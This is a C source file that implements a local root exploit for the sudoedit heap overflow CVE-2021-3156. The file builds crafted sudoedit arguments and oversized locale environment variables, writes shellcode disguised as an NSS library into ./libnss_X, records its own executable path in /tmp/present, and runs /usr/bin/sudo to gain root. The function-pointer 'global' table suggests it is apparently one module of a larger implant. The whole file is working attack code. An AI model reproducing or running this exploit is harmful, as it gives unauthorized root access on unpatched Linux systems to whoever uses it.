#include "lpe.h"
#include "shellcode.h"
#include "utils.h"
#define ENV_LEN 512
#define TARGET_OFFSET_START 0x786
#define TMP_PATH "/tmp/present"
#define PATH_LEN 255

char *env_var(char *var, int overflow_len, char c) {
  DEBUG_LOG("Creating env_var %s with overflow %d\n", var, overflow_len);

  int len = global->strlen(var);
  char *p = global->calloc(len + overflow_len + 1, sizeof(char));
  global->memcpy(p, var, len);
  global->memset(p + len, c, overflow_len);
  return p;
}

void write_exe_to_tmp() {
  DEBUG_LOG("Writing exe to file\n");
  FILE *tmp = global->fopen(TMP_PATH, "w");
  CHECK(tmp == 0);
  char path[PATH_LEN] = {0};

  CHECK(global->readlink("/proc/self/exe", path, sizeof path) == -1);
  CHECK(global->fwrite(path, sizeof(char), global->strlen(path), tmp) == 0);

  global->fclose(tmp);
}

void drop_shell() {
  DEBUG_LOG("Dropping shell code\n");

  global->mkdir("./libnss_X", 0777);
  FILE *p = global->fopen("./libnss_X/X1234.so.2", "w");

  CHECK(p == 0);

  global->fwrite(SHELLCODE_BIN, sizeof(char),
                 sizeof(SHELLCODE_BIN) / sizeof(char) - 1, p);
  global->fclose(p);
}

void try_get_root(Globals *glob) {
  global = glob;
  DEBUG_LOG("%x Checking for root\n");

  if (global->geteuid() == 0) {
    DEBUG_LOG("Running as root!\n");
    return;
  }

  DEBUG_LOG("Trying to gain root\n");

  // https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss_manual.py
  char *A = global->calloc(0xe0 + 1 + 1, sizeof(char));
  global->memset(A, 'A', 0xe0);
  A[0xe0] = '\\';

  char *e_argv[] = {"sudoedit", "-A", "-s", A, 0};

  int env_pos = 0;
  char *envp[ENV_LEN];

  char *target = global->calloc(TARGET_OFFSET_START + 2, sizeof(char));
  global->memset(target, 'B', TARGET_OFFSET_START);
  target[TARGET_OFFSET_START] = '\\';

  envp[env_pos++] = target;

  for (int i = 0; i < 13; ++i) {
    for (int j = 0; j < 0x18; ++j) {
      envp[env_pos++] = "\\";
    }
    envp[env_pos++] = "X/X1234\\";
  }

  envp[env_pos - 1] = "X/X1234";

  char lc_var[] = "LC_CTYPE=C.UTF-8@";
  int env_len = global->strlen(lc_var);
  char *var = env_var(lc_var, 0x28 + 3, 'C');
  var[env_len + 0x28] = ';';
  var[env_len + 0x28 + 1] = 'A';
  var[env_len + 0x28 + 2] = '=';

  envp[env_pos++] = var;
  envp[env_pos++] = env_var("LC_NUMERIC=C.UTF-8@", 0xd8, 'D');
  envp[env_pos++] = env_var("LC_TIME=C.UTF-8@", 0x28, 'E');
  envp[env_pos++] = env_var("LC_COLLATE=C.UTF-8@", 0x28, 'F');
  envp[env_pos++] = env_var("LC_IDENTIFICATION=C.UTF-8@", 0x78, 'G');
  envp[env_pos++] = "TZ=:";
  envp[env_pos++] = 0;

  write_exe_to_tmp();
  drop_shell();

  global->execve("/usr/bin/sudo", e_argv, envp);
}
